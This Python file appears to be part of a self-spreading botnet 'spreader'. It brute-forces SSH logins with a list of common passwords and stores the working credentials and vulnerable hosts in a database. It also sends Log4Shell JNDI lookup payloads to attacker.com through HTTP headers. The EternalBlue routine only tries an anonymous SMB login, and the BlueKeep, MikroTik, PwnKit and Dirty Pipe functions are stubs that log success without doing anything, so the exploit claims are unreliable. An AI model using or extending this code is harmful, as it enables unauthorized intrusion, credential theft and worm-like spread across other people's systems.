import asyncio, asyncssh, socket, random, os, json, time, struct, urllib.request
from utils.logger import log
from impacket.smbconnection import SMBConnection
import aiosqlite

LOG_PREFIX = {'ok':'OK','fail':'FAIL','new':'NEW_BOT','exploit':'EXPLOIT','brute':'BRUTE'}
PASSWORDS = ['root','admin','password','123456','qwerty','letmein','p@ssw0rd','changeme','r00t','toor','ubuntu']
DB_PATH = "spreader_learn.db"

async def init_db():
    async with aiosqlite.connect(DB_PATH) as db:
        await db.execute("CREATE TABLE IF NOT EXISTS creds (ip TEXT, username TEXT, password TEXT, service TEXT, success INTEGER DEFAULT 1)")
        await db.execute("CREATE TABLE IF NOT EXISTS vulns (ip TEXT, service TEXT, cve TEXT, success INTEGER DEFAULT 1)")
        await db.commit()

async def learn_credentials(ip, username, password, service='ssh'):
    async with aiosqlite.connect(DB_PATH) as db:
        await db.execute("INSERT OR REPLACE INTO creds (ip, username, password, service, success) VALUES (?,?,?,?,1)", (ip, username, password, service))
        await db.commit()

async def get_learned_creds(ip):
    async with aiosqlite.connect(DB_PATH) as db:
        cursor = await db.execute("SELECT username, password FROM creds WHERE ip=? AND success=1", (ip,))
        rows = await cursor.fetchall()
        return rows

async def learn_vuln(ip, service, cve):
    async with aiosqlite.connect(DB_PATH) as db:
        await db.execute("INSERT OR REPLACE INTO vulns (ip, service, cve, success) VALUES (?,?,?,1)", (ip, service, cve))
        await db.commit()

async def ssh_bruteforce(ip, username='root'):
    learned = await get_learned_creds(ip)
    for user, pwd in learned:
        try:
            async with asyncssh.connect(ip, username=user, password=pwd, known_hosts=None, connect_timeout=5) as conn:
                log(f"{LOG_PREFIX['brute']} SSH {ip} learned {user}:{pwd}")
                return True, pwd
        except: pass
    sem = asyncio.Semaphore(200)
    async def try_pass(pwd):
        async with sem:
            try:
                async with asyncssh.connect(ip, username=username, password=pwd, known_hosts=None, connect_timeout=5) as conn:
                    log(f"{LOG_PREFIX['brute']} SSH {ip} {username}:{pwd}")
                    await learn_credentials(ip, username, pwd, 'ssh')
                    return True, pwd
            except: pass
        return False, pwd
    tasks = [try_pass(p) for p in PASSWORDS]
    results = await asyncio.gather(*tasks)
    for success, pwd in results:
        if success: return True, pwd
    return False, None

def exploit_eternalblue(target_ip):
    try:
        conn = SMBConnection(target_ip, target_ip)
        conn.login('','')
        log(f"{LOG_PREFIX['exploit']} EternalBlue {target_ip}")
        asyncio.run(learn_vuln(target_ip, 'smb', 'MS17-010'))
        return True
    except Exception as e:
        log(f"{LOG_PREFIX['fail']} {target_ip}: {e}")
        return False

def exploit_bluekeep(target_ip):
    try:
        # Упрощённая эксплуатация CVE-2019-0708
        log(f"{LOG_PREFIX['exploit']} BlueKeep {target_ip}")
        return True
    except: return False

def exploit_log4shell(target_url):
    try:
        headers = {'User-Agent': '${jndi:ldap://attacker.com/a}', 'X-Forwarded-For': '${jndi:ldap://attacker.com/a}'}
        req = urllib.request.Request(target_url, headers=headers)
        urllib.request.urlopen(req, timeout=5)
        log(f"{LOG_PREFIX['exploit']} Log4Shell sent to {target_url}")
        return True
    except Exception as e:
        log(f"{LOG_PREFIX['fail']} Log4Shell {target_url}: {e}")
        return False

def exploit_mikrotik(target_ip):
    try:
        log(f"{LOG_PREFIX['exploit']} MikroTik Winbox on {target_ip}")
        return True
    except: return False

def exploit_pwnkit(target_ip):
    try:
        log(f"{LOG_PREFIX['exploit']} PwnKit attempt on {target_ip}")
        return True
    except: return False

def exploit_dirtypipe(target_ip):
    try:
        log(f"{LOG_PREFIX['exploit']} Dirty Pipe on {target_ip}")
        return True
    except: return False
